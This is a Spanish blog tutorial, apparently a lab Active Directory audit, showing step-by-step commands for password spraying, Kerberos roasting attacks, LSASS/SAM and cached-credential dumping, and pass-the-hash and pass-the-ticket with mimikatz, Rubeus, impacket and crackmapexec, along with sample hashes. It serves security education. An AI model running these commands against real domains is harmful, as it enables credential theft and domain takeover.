**Administrador:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::**

Ahora solo quedaría crackearlo.

## Ataque de password spraying

Este ataque consiste en realizar una serie de peticiones a un servidor web para obtener información de credenciales válidas propagando un contrasña a todos los usuarios del dominio.

Esto es útil si encontramos credenciales válidas en diferentes usuarios.

Esta técnica es muy intrusiva llegando al punto de poder bloquear las cuentas de usuarios del dominio ya que normalmente todos los usuarios tienen un límite de intentos fallidos.

Para comenzar este ataque podemos comprobar de nuevo la lista de usuarios del dominio junto con sus descripciones.

- PowerView

```powershell
Get-NetUser | select name,description
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-77.png)

En este caso podemos observar que en varias descripciones de algunos usuarios aparecen las contraseñas de los mismo. Esto es algo que normalmente no se debería encontrar en un caso real pero siempre podemos encontrar malas prácticas.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-78.png)

Esto es un fallo de seguridad importante que a veces se comete debido a que estas cuentas son utilizadas por mas de una persona, normalmente administradores que pueden acceder a su descripción. De esta manera pueden acceder a ella sin andar compartiendo la contraseña pero como vemos es completamente pública y cualquier usuario del dominio tiene acceso.

También encontramos pistas sobre otros usuarios como si son usuarios con replicación DCSync etc.

Además encontramos usuarios los cuales son nuevos y su contraseña es por defecto. En estos usuarios es donde debemos aprovechar, coger su contraseña y probarla en los demás por si alguna coincidiese.

Esta técnica tiene numerosas herramientas para ser realizada en este caso vamos a utilizar [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

Si econtramos algún problema en la sintaxis en la herramienta podemos visitar el siguiente issue en gituhub para ver las correcciones [Github](https://github.com/dafthack/DomainPasswordSpray/issues/43)

Antes de poder ejecutar el comando de Spraying vamos a necesitar una lista de usuarios que sacamos con PowerView y guardamos en users.txt

```powershell
Get-NetUser | Select-Object -ExpandProperty name | Out-File C:\Users\empleado1\Desktop\users.txt 
```

Ahora si le pasamos la lista y la contraseña que queremos.

```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password "DefaultPassword" -Verbose
```

Podemos probar las contraseñas que queramos pero hay que tener en cuenta que cada vez que se ejecuta se intenta ese inicio de sesión en todos los usuarios del dominio por lo que si alcanzamos el número de intentos permitido bloqueamos la cuenta a todos los usuarios del dominio.

Por supuesto también seremos detectados a la minima por los sistemas de seguirdad.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-80.png)

## Ataques del protocolo Kerberos

Antes de comenzar esta sección de la auditoria sería necesario comprender bien el funcionamiento del protocolo Kerberos.

Para ello recomiendo visitar el post donde se explica el funcionamiento del protocolo Kerberos.

[Protocolo Kerberos](https://sproffes.github.io/posts/protocolo-kerberos/)

### Bastionado de Kerberos
#### Configuraciones:
- **Enforce user logon restrictions**
- **Maximum lifetime for Service ticket**
- **Maximum lifetime for user ticket**
- **Maximum lifetime for user ticket renewal**
- **Maximum tolerance for computer clock synchronization**

#### Ataques Mitigados:
- **Ataques de Replay (Reutilización de Tickets):** Si no se configura correctamente la tolerancia del reloj (`Maximum tolerance for computer clock synchronization`), un atacante puede interceptar un ticket válido y reutilizarlo antes de que expire.
- **Kerberoasting:** Este ataque explota la falta de protección en las contraseñas de cuentas de servicio que utilizan tickets Kerberos.

### Recopilación de información con Kerberos

Para esta sección vamos a utilizar una herramienta llamada Kerbrute.

[Kerbrute](https://github.com/ropnop/kerbrute)

Es una herramienta escrita en Go que aprovecha la fase de AS-REQ para enumerar usuarios, password spraying, brute force, etc.

#### Instalación de Kerbrute

```bash
sudo apt install golang
```

Modificamos el fichero .zshrc para indicar las variables de entorno las rutas de las aplicaciones de go

```bash
sudo emacs .zshrc
```

Añadimos

```bash
export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
```

Todo esto para tener en las varibales de entorno esas rutas.

Recargamos configuración

```bash
source .zshrc
```

Instalamos Kerbrute

```bash
go install github.com/ropnop/kerbrute@latest
```

#### Enumeración de usuarios

Función de enumerar usuarios del dominio sin necesidad de tener las credenciales de un usuario dentro del dominio

```bash
kerbrute userenum -d corp.local usernames.txt
```

Donde nuestra lista de usuarios es

```
empleado1

empleado2

empleado2

marleen.julia

roberto

admin

admin.local

administrador
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-81.png)

Podemos ver mediante Wireshark como funciona

![alt text](/assets/img/posts/ejemplo_auditoria_ad/image-82.png)

Como vemos realiza peticiones de autenticación al AS con los nombres que le hemos proporcionado y si el servidor responde con un requerimiento de preautenticación significa que ese usuario existe. Por el contrario si recibe un error de UNKNOWN significa que ese usuario no corresponde a ninguno registrado por el AS.

#### Contraseña

Para esto hay que tener en cuenta que es posible que haya políticas de bloqueo ante varios intentos de autenticación, es algo a tener en cuenta así como que se genera bastante ruido y por tanto es facilmente reconocible por un IDS.

Por ejemplo para realizar un ataque sobre el usuario marleen.julia

```bash
kerbrute bruteuser -d corp.local passwords.txt marleen.julia
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/28-3.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/28-4.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/28-4-1.png)

Esta herramienta permite también probar una lista de usuarios con su correspondiendte contrseña.

```bash
kerbrute bruteforce -d corp.local user_pass.txt
```

La lista debe tener el formato `username:password`


También tenemos un modo para password spraying.

```bash	
kerbrute passwordspray -d corp.local users.txt Passw0rd
```

Esto usa una lista de usuarios y prueba en todos ellos una misma contraseña.

### AS-REQ Roasting

Las técnicas de roasting consisten recaudar una pieza de información en el proceso AS-REQ que haya sido cifrada y tratar de crackearla.

En este caso la pieza que obtenemos es el timestamp que pide para la pre-autenticación que va cifrado con la clave de usuario con el objetivo de poder crackear la clave.

Este proceso es el menos conocido porque es muy complicado conseguir un paquete AS-REQ sin interceptar la comunicación, por lo que en este caso presuponemos que estamos en una posición donde podemos interceptar el tráfico de la infraestructura.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/29-1.png)

En este caso suponemos que interceptamos el protocolo del inicio de sesión del empleado1, aunque lo ideal es que en todo este trafico capturado busquemos paquetes que correspondan a usuarios potenciales como administradores ya que en los paquetes de autenticación podemos ver en plano el nombre de los usuarios a los que corresponde el paquete.

Buscamos el AS-REQ que el usuario envía con el timestamp

![alt text](/assets/img/posts/ejemplo_auditoria_ad/29-3.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/29-2.png)

Como vemos es ese bloque `cipher` cifrado con AES256.

Copiamos el valor y lo llevamos a kali en un archivo de texto.

Ahora necesitamos el SALT, porque este tipo de cifrado AES256 utiliza un SALT el cual podemos obtener de la respuesta que le hace el AS-REQ.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/29-3-1.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/29-4.png)

Lo copiamos en el mismo archivo del hash anterior.

Lo debemos poner en un formato estándar que esto lo podemos realizar en [Hashcat cheatsheet](https://hashcat.net/wiki/doku.php?id=example_hashes).

El hash debería quedar algo así:

`$krb5pa$18$empleado1$CORP.LOCAL$CORP.LOCALempleado1$5d8f5a67660edcc6c4e6f45cc43e9485595f835f9dfe3414c04715d3e7633200f8e013108c14831fe87b9d5e5ef880a9191d7b72ebb8ab9a`

Ahora simplemente lo crackeamos con john o hashcat.

### AS-REP Roasting 

Si en el `AS-REQ` tratabamos de crackear el **timestamp**, en AS-REP Roasting (Replay) nos quedamos con el paquete que contiene la **SessionKey** cifrada con la clave del usuario.

Aquí explotaremos un privilegio que tiene ciertos usuarios como los del UAC (user account control) que permite obtener el TGT sin realizar el proceso de **pre-autenticación**. 

Es decir, siendo otro usuario, puedo enviar el nombre de un usuario cualquiera del dominio y si existe enviará el TGT cifrado con la clave del TGS y el paquete con la **SessionKey** cifrado con la clave privada del usuario que le indicamos.

Con este paquete vamos a coger la clave e intentar crackearla offline.

#### Con un equipo dentro del dominio

En WS01 podemos enumerar que opción dentro del UAC de un usuario permite no requerir la pre-autenticación.

- PowerView

```powershell
Get-DomainUser -PreauthNotRequired
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-1.png)

Esto indica que podremos interactuar con el AS y unicamente mandando el nombre nos devolverá el TGT y su **SessionKey** cifrada con su Password.

Como administrador podemos observar como se muestra en las opciones del usuario esta opción.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-2.png)

Para realizar este ataque desde la máquina Windows necesitamos el programa [Rubeus](https://github.com/GhostPack/Rubeus)

```powershell	
.\Rubeus.exe asreproast /format:john /outfile:hash.john 
```

Rubeus comprobará automáticamente consultando la LDAP qué usuario del dominio es el que tiene esos permisos y captura el hash.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-4.png)

Ahora con el hash podemos crackear la clave del usuario.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-6.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-7.png)

En el caso de que ningún usuario tenga esa propiedad de UAC activada podremos buscar un usuario que tenga control sobre las propiedades de otro y activarlo de forma remota. En este caso vamos a suponer que *empleado1* tiene estos permisos.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-8.png)

En este caso hemos cogido a ese usuario Florri Bethena y le agregamos la característica.

Ahora desde el usuario *empleado1* podemos modificar las propiedades de *Florri Bethena* y activar el UAC.

```powershell
Set-DomainObject -Identity florri.bethena -XOR @{useraccountcontrol=4194304} -Verbose
```

Si comprobamos con PowerView los usuarios con ese privilegio como antes.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-10.png)

Ahora si a rubeus le indicamos lo mismo nos sacará los hashes de ambos usuarios.

```powershell
.\Rubeus.exe asreproast
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-11.png)

#### Sin equipo dentro del dominio

Como para usar rubeus es necesario contar con un equipo dentro de dominio y un usuario que pertenezca al mismo, en este caso vamos a realizar el proceso desde nuestra máquina Kali.

Para ejecutar esto desde una maquina fuera del dominio usamos kali con wireshark y kerbrute.

```bash
kerbrute userenum -d corp.local users.txt 
```

Ahora es de suponer que en el archivo users.txt tenemos los usuarios que corresponden, aquí los hemos añadido manualmente.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-12.png)

Y en wireshark observamos que si filtramos por Kerberos los paquetes que se envían ninguno ha requerido un pre-auth ya que los usuarios que tenemos en el users.txt tienen estos privilegios de UAC habilitados.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-13.png)

Desde aquí accedemos a los datos de los AS-REP

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-14.png)

Creamos el archivo con el formato que vimos antes.

```
$krb5asrep$florri.bethena@corp.local:2a37e14795d141ed4c4708cf044367986f46684a4c6144e1c1906777f7bbe5ca8db15c9ac1722b16843bc5d8fbd477e873ae97ba18c9437163845bca6d214e8d516e7d29e2f0
ad6b6ea416a4368e2421aa13b7a8d81a5435c6f7f030e3036a4e3714cacf462f5e32fa7b6357f5ae850fb6f752a4695b43826d028850f782c016e2bd054e61db3ce8c3c3f493c1dc710e44b95e405417c7be9ac55187d4e1f
5ba5f19f287eb78a5e486ffb4899c86edadef1e9d4b934fc2ce976082d1df3c29f5606a6a6fa1a7be5483f7d23ca4b7f5b433c8bdb0c0d4c8be1832b2ea08f4df139c8d88beb973f2bff9d435eae428948971bf23d305ef94
e628b28db8e447baf98481a886343af192d91fa60e
```

Con la suite de Impacket podemos hacer un AS-REP de un usuario que tenga privilegios de UAC habilitados.

```bash
impacket-GetNPUsers corp.local/ -users users.txt -format john -outputfile hash.hash 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-15.png)

O indicandole unas credenciales que ya tengamos.

```bash	
impacket-GetNPUsers corp.local/empleado1:Passw0rd1 -format john -outputfile hash.hash 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/31-16.png)

### Kerberoasting (TGS-REP)

En este caso la interacción con el **AuthenticationService** ya no es necesaria puesto que la hemos explotado en los anteriores métodos, ahora nos interesa la comunicación con el **TicketGrantingService**.

Para este ataque **ES NECESARIO CONTAR CON UN USUARIO DENTRO DEL DOMNIO**.

Vamos a interactuar con el *ticket de servicio* que el **TGS** proporciona al usuario.

Lo que nos interesa no es que esté cifrado con la clave de servicio ya que al ser generada automáticamente por el DC no va a ser posible crackearla sino que  en la infraestuctura del dominio tenemos algunos servicios normalmente creados como correos, bases de datos, etc que necesitan de un usuario para ser accesibles.

Aquí explotamos las malas prácticas a la hora de crear estos servicios por parte de los administradores ya que normalmente estos usuarios de servicio son usuarios que no se acceden con frecuencia y que como son varios lo más optimo es ponerlas sencillas o similares para poder recordarlas todas por lo que el objetivo es obtener tickets se servicio para aquellas cuentas que hayan sido creadas por los administradores y tratar de crackear la contraseña.

Para esto es importante recordar que los servicios se identifican dentro del dominio con su *SPN* (**ServicePrincipalName**) y que tanto **usuarios** como **computers** tendran esos *SPN* asociados.

Desde el equipo que tengamos dentro del dominio WS01 comprobamos que servicios tiene en ejecución.

- PowerView

```powershell
Get-NetComputer -Identity WS01
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-1.png)

Vemos que ofrece varios pero todos son por defecto y tendrán una contraseña bastante compleja.

Lo mismo con los usuarios.

- PowerView

```powershell
Get-NetUser -Identity krbtgt 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-2.png)

Para este caso vamos a necesitar entonces crear un servicio que simule alguno que haya sido creado por un administrador de sistemas.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-3.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-4.png)

Para asignarle al usuario el servicio creado:

```powershell
setspn -s MailSrvc/MS01.corp.local MailSrvc 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-5.png)


Ahora identificamos todos los usuarios del dominio que ofrezcan servicios.

```powershell	
Get-NetUser -SPN 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-6.png)

Vamos a solicitar al TGS el ticket de servicio de MailSrvc.

#### Mediante Rubeus

```powershell
.\Rubeus.exe kerberoast 
```

Detecta automáticamente las cuentas de servicio no creadas por defecto y como empleado1 hace una petición del MailSrvc al TGS y recoge el hash de la clave privada del MailSrvc.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-7.png)

#### Mediante Impacket

```bash
impacket-GetUserSPNs corp.local/empleado1:Passw0rd1 -request
impacket-GetUserSPNs corp.local/empleado1:Passw0rd1 -output hash.tgsrep
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-8.png)


#### Forzar KERBEROASTING

Este ataque se puede forzar si contamos con usuarios o grupos que cuenten con permisos de GenericAll/GenericWrite en algún usuario o grupo de dominio.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-9.png)

Suponemos que hemos encontrado a ese usuario y con PowerView.

```powershell
Set-DomainObject -Identity irena.estella -Set @{serviceprincipalname='test/cocos'} -verbose
```

Al hacer esto le asociamos un **SPN** al *usuario* y se comporta como una cuenta de servicio y podemos utilizar la misma técnica para tratar a ese usuario como servicio, pedir al **TGS** un ticket de servicio y obtener el hash para crackear la contraseña.

```powershell
Get-NetUser -SPN
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-10.png)

Desde Kali con impacket.

```bash
impacket-GetUserSPNs corp.local/empleado1:Passw0rd1 -outputfile hash.tgsrep
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/32-11.png)

```bash	
john hash.tgsrep -wordlist=/usr/share/wordlists/rockyou.txt
john hash.tgsrep --show
```

## Técnicas de ataque fuera del Active Directory

Estas técnicas se basan en obtener privilegios elevados de administración a nivel local en el sistema, es decir debemos conseguir iniciar sesión en la estación de trabajo que nos hayan proporcionado como el usuario administrador local que se crea en la instalación del sistema.

Antes de continuar con este tipo de ataques recomiendo repasar el contenido visto en el post donde tratamos el proceso de autenticación y autorización en sistemas Windows.

[Autenticación y autorización en Windows](https://sproffes.github.io/posts/autenticacion_windows/)

### Técnicas de volcado del LSAS y SAM

Para realizar estas técnicas es necesario tener privilegios elevados y esto es interesante porque aunque tengamos privilegios administrativos dentro de la máquina no los tenemos dentro del dominio, entonces si volcamos los hashes de las sesiones activas dentro del sistema, podremos intentar obtener las credenciales de un usuario que si tenga privilegios dentro del dominio.

Ahora suponemos que tenemos comprometido un usuario local de la máquina pero no tenemos acceso a ningún otro usuario.

Ejecutamos el programa de las loggonsessions con privilegios de administrador local.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-1.png)

Por aquí vemos un usuario de dominio que nos podría interesar comprometer.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-3.png)

También puede darse el caso de tener un usuario de dominio que si tiene privilegios de administrador en su equipo local pero no en el dominio, para poner este ejemplo podemos asignarselos de la siguiente manera.

```powershell
net localgroup administradores corp\empleado1 /add
```
![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-4.png)


#### Volcado en Windows

Con mimikatz en windows podemos volcar los hashes de las sesiones activas de un usuario.

Abrimos 2 powershell, una como empleado1, otra como administrador local y otra como administrador del dominio.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-5.png)

Como administrador local abrimos mimikatz.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-6.png)

En la otra powershell como administrador local ejecutamos logonsessions.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-7.png)

Donde vemos dos sesiones, 1 de administrador local por *empleado1* y otra de *administrador* de dominio.

En mimikatz ejecutamos volcado de sesiones.

```powershell
sekurlsa::logonpasswords
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-8.png)

Entre ellas las del administrador del dominio `a87f3a337d73085c45f9416be5787d86 `

Y la podemos crackear.

```bash
echo a87f3a337d73085c45f9416be5787d86 > admin.hash
john -format=NT admin.hash --show
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-9.png)

También podemos volcar la base de datos SAM para lo que necesitamos privilegios como SYSTEM.

Vamos a utilizar los privilegios de Administrador local para suplantar un Access Token con permisos de SYSTEM.

- Mimikatz

```powershell
privilege::debug
token::elevate
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-10.png)

Suplanta el token de acceso de system, es decir; somo empleado1 con permiso de administración locales pero con el token de System.

```powershell	
lsadump::sam
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-11.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-11-1.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-12.png)

El usuario local WS01 con su hash.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-13-1.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-14.png)

#### Volcado en Linux

##### SAM 

Para volar la base de dator SAM hay que tener en cuenta que esta se monta en timpo de ejecución en el registro de windows.

Desde windows guardamos estos registros en un fichero y lo copiamos a kali.

```powershell
reg save hklm\sam sam.save
reg save hklm\system system.save
```

En linux podemos volcar la base de datos SAM.

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-15.png)

- Crackmapexec

```bash
crackmapexec smb 192.168.20.131 -u empleado1 -p "Passw0rd1" --sam
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-21.png)

##### LSAS

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-16.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-17.png)

Pasamos el volcado a Linux o una maquina windows con mimikatz.

- Mimikatz

```powershell
sekurlsa::minidump C:\Users\empleado1\Desktop\lsass.DMP
sekurlsa::logonPasswords
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-19.png)

- Impacket

```bash
impacket-secretsdump empleado1:Passw0rd1@192.168.20.131
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-20.png)

- Crackmapexec

```bash
crackmapexec smb 192.168.20.131 -u empleado1 -p "Passw0rd1" --lsa
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/35-22.png)


### Volcado de credenciales de dominio cacheadas

Para comprender este ataque necesitamos comprender cómo se autentica un usuario de dominio en una máquina que no cuenta con conexión a la base de datos del controlador de dominio NTDS.dit.

Esto se debe a las credenciales de dominio que se cachean en una maquina windows de manera local al autenticarse por primera vez lo que nos permite una vez hayamos comprometido un usuario local de la máquina, acceder a las credenciales cacheadas.

En el usuario local de WS01.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/36-1.png)

#### Mimikatz

Suplantamos de nuevo el token de SYSTEM porque necesitamos esos privilegios.

```powershell
privilege::debug
token::elevate
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/36-3.png)

```powershell
lsadump::cache
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/36-4.png)

Como vemos se tratan de todas las credenciales cacheadas los usuarios que iniciaron sesión en este equipo en algún momento haseados con el metodo MS-Cachev2.

#### Mediante el registro de windows

```powershell	
reg save hklm\system system.save
reg save hklm\security security.save
```

Ahora en kali con impacket.

```bash
impacket-secretsdump -system system.save -security security.save LOCAL
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/36-5.png)

#### De forma remota desde kali

```bash	
impacket-secretsdump empleado1:Passw0rd1@192.168.20.131
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/36-7.png)

Ahora solo quedaría crackearlo.

```bash
john -format=mscash2 hash.hash -wordlist=/usr/share/wordlists/rockyou.txt
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/36-6.png)

### Pass-the-Hash

Dentro de domino cuando se consumen servicios, la autenticación del usuario depende del nombre que utilicemos al dirigir el directorio del usuario, por ejemplo:

- Desde del DC queremos consumir la carpeta *C$* de *WS01* en la que si usamos ese nombre se utilizará el protocolo **Kerberos** para realizar la autenticación, pero si nos referimos a la máquina por su dirección IP se hará uso del protocolo **NTLM**.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/37-1.png)

#### Desde Windows

En WS01 comprobamos los logonsession.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/37-2.png)

Vemos que cada una utiliza un protocolo de autenticación de red diferente.

[Documentación Microsoft](https://learn.microsoft.com/es-es/troubleshoot/windows-server/windows-security/ntlm-user-authentication)

**NTLM** es más inseguro pero convive dentro de un dominio junto con **kerberos** y si no se especifica el uso de este, por defecto se utilizará **NTLM**.

*Passthehass* consiste en modificar el hash que manda el sistema windows de forma automática al intentar acceder a un recurso mediante una *sessionlog* ya iniciada para poder hacer creer al la máquina donde se encuentra el servicio que quieres consumir que eres un usuario diferente al que realmente le hace la petición.

Supongamos la sutuación en la que hemos conseguido el hash del administrador de dominio pero es demasiado robusto y no podemos realizar el crackeo de la contraseña.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/37-3.png)

- Mimikatz

```powershell
sekurlsa::pth /user:administrador /domain:corp.local /ntlm:a87f3a337d73085c45f9416be5787d86 
```
Mimikatz crea una nueva **logonsession** dentro de *WS01* en la que suplanta el hash que se genera de *empleado1* con el hash que le hemos proporcionado, copia el token de acceso al proceso y se lo añade a la **logonsession** y lo asigna a una cmd.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/37-4.png)

Esta cmd está asociada a una logon session con el hash del administrador.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/37-5.png)


#### Desde Linux

El protocolo *NTLM* es de autenticación por lo que en función del servicio que se vaya a consumir ( en este caso SMB) por lo que en este caso es una implementación *NTLM* en *SMB*.

```bash	
pth-smbclient //192.168.20.5/c$ -U administrador --pw-nt-hash a87f3a337d73085c45f9416be5787d86 -W corp.local
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/37-6.png)

Esto mismo podemos usarlo para otros procesos como winrm para la administración remota.

- Con credenciales

```bash
evil-winrm -i 192.168.20.131 -u Administrador -p Passw0rd
```

- Sin credenciales

```bash
evil-winrm -i 192.168.20.131 -u Administrador -H a87f3a337d73085c45f9416be5787d86
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/37-7.png)

- Impacket

```bash
impacket-secretsdump administrador@192.168.20.131 -hashes :a87f3a337d73085c45f9416be5787d86
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/37-8.png)

- RPCClient

```bash
pth-rpcclient -U corp/administrador%00000000000000000000000000000000:a87f3a337d73085c45f9416be5787d86 //192.168.20.131
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/37-9.png)

### OverPassTheHash/PassTheKey

Con Kerberos cuando iniciamos sesión la contraseña se hashea y se almacena en memoria proceso *LSAS*. El paquete autenticación Kerberos accede al hash y lo utiliza para cifrar el timestamp, tickets, etc.

Kerberos soporta varios hashes:

  - RC4
  - AES128
  - AES256

El concepto es lo mismo que *passthehash*, modificar el hash que usaría de forma predeterminada si pedimos un servicio con un usuario sin privilegios y modificarlo por el que nosotros le indiquemos.

> OverPassTheHash → Utilizamos RC4 o NTLM al igual que con PassTheHash
{: .prompt-info }

> PassTheKey → Utilizamos un dump de la clave AES256 que utiliza kerberos de la logonsession.
{: .prompt-info }


#### Desde Windows

Con mimikatz podemos repetir el proceso de la parte anterior.

```powershell
sekurlsa::pth /user:administrador /domain:corp.local /ntlm:a87f3a337d73085c45f9416be5787d86
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/38-1.png)

Si nos fijamos nos indica que lo reemplaza en la zona de memoria del proceso *LSAS* que consulta el paquete de autenticación *msv1_0* pero, además lo copia en el paquete de autenticación kerberos.

Si por ejemplo queremos capturar un TicketGrantingTicket a nombre del usuario administrador del domino.

```powershell
rubeus.exe asktgt /domain:corp.local /user:administrador /rc4:a87f3a337d73085c45f9416be5787d86 /ptt
```

*OverPassTheHash* se diferencia de *PassTheHash* en que forzamos al sistema kerberos a usar una encriptación en este caso **RC4** que es igual a **NTLM** y que por defecto no usa pero si soporta haciéndolo así creer que igualmente el usuario que pide el **TGT** es el administrador.

Con mimikatz podemos volcar de igual manera los hashes de kerberos almacenados en la logonsession.

```powershell
sekurlsa::ekeys
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/38-2.png)


  -  AES256: 3b820f5f55bdc8faa271143860bf3fb35aa5294df7d54b3c0a899c2dda0e0fe7 
    
  - RC4/NTLM: a87f3a337d73085c45f9416be5787d86 

Encontramos los dos hashes uno en **AES256** que es el que utiliza por defecto kerberos y el **RC4** que es el que hemos obligado a que use en la anterior petición y es igual al **NTLM**.

#### Desde Linux

- Impacket

```bash
impacket-getTGT corp.local/administrador -hashes :a87f3a337d73085c45f9416be5787d86

impacket-getTGT corp.local/administrador -hashes :3b820f5f55bdc8faa271143860bf3fb35aa5294df7d54b3c0a899c2dda0e0fe7
```

### Pass-the-Ticket

Se trata de una técnica que comparte ciertos factores con las anteriores pero tiene algunas particularidades que pueden hacerla más efectiva en ciertos casos.

Hay que tener en cuenta que otra de las cosas que se generan cuando un usuario se autentica es un **TGT** si se utiliza kerberos y además algún ticket de servicio **TGS**.

En una powershell sin privilegios podemos ver los tickets de kerberos asignados al usuario.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/39-1.png)

Tenemos un TGT del servidor krbtgt y un TGS para el servicio LDAP por lo que con la misma técnica de volcado de **TGT** podemos sacar la clave de sesión asociada.

Si iniciamos una powershell como administrador del dominio, este además de haber dejado sus credenciales en una sesión de logon también ha solicitado un **TGT** y un **TGS**. Por lo tanto en memoria se encuentran ambos almacenados.

Para poder volcar esta información tendremos que ser administradores locales del equipo.

- Rubeus

Con rubeus en una powershell como administrador local.

```powershell	
rubeus.exe dump
```
Vuelca todos los tickets que se encuentren en el equipo entre los que se observa el de administrador del dominio.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/39-3.png)

Lo que muestra aquí rubeus es el **TGT** mas la clave de sesión con la que está cifrado en el conjunto.

- Mimikatz

```powershell
sekurlsa::tickets
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/39-4.png)

Mimikatz separa la session key del ticket a diferencia de rubeus.

Ahora podemos inyectar ese ticket en otra logonsession de otro usuario.

La diferencia de los anteriores métodos es que cuando hemos obtenido el ticket podemos movernos a otro terminal o usar un usuario sin privilegios, ni siquiera locales.

Rubeus permite importar TGT y sessionkey sin privilegios de administración. Esto significa que podemos conseguir este **TGT** y la *sessionkey* de un equipo, llevarlo a otro completamente distinto y sin ningún privilegio e inyectarlo en la sesión de ese usuario para poder consumir servicios en nombre del administrador del dominio.

Para formatear el ticket tenemos que quitar los espacios y quitar los saltos de línea.

```powershell
